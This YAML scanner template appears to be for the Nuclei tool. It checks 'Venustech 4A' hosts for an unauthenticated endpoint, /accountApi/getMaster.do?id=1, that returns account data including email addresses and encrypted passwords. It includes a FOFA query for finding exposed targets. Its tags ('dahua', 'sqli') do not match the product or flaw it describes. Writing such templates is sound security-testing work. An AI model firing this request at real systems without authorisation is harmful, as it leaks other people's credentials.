id: venustech-4a-getMaster-disclosure

info:
  name: Venustech 4A - Disclosure
  author: Co5mos
  severity: critical
  metadata:
    max-request: 1
    fofa-query: body="cas/css/ace-part2.min.css"
  tags: dahua,sqli

http:
  - method: GET
    path:
      - "{{BaseURL}}/accountApi/getMaster.do?id=1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'authtype'
          - 'cryptPwd'
          - 'email'

      - type: status
        status:
          - 200